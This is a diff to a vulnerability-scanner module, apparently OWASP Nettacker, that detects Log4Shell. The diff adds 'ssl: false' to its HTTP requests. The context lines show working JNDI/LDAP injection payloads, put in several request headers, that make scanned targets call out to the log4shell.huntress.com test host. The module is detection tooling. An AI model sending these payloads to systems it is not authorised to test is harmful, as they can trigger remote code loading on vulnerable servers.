@@ -22,7 +22,8 @@ payloads:
       - method: get
         timeout: 3
         headers:
-           User-Agent: "{user_agent}"
+          User-Agent: "{user_agent}"
+        ssl: false
         url: "https://log4shell.huntress.com/"
         response:
           save_to_temp_events_only: log4shell_token
@@ -93,6 +94,7 @@ payloads:
           - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+        ssl: false
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
@@ -178,7 +180,7 @@ payloads:
           - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-
+        ssl: false
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
@@ -264,7 +266,7 @@ payloads:
           - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-
+        ssl: false
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
@@ -350,6 +352,7 @@ payloads:
           - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+        ssl: false
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
@@ -438,7 +441,7 @@ payloads:
           - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-
+        ssl: false
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
@@ -524,7 +527,7 @@ payloads:
           - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-
+        ssl: false
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
@@ -610,7 +613,7 @@ payloads:
           - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
           - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
-
+        ssl: false
         url:
           nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
@@ -643,6 +646,7 @@ payloads:
         timeout: 3
         headers:
           User-Agent: "{user_agent}"
+        ssl: false
         url:
           nettacker_fuzzer:
             input_format: "https://log4shell.huntress.com/json/{{token}}"
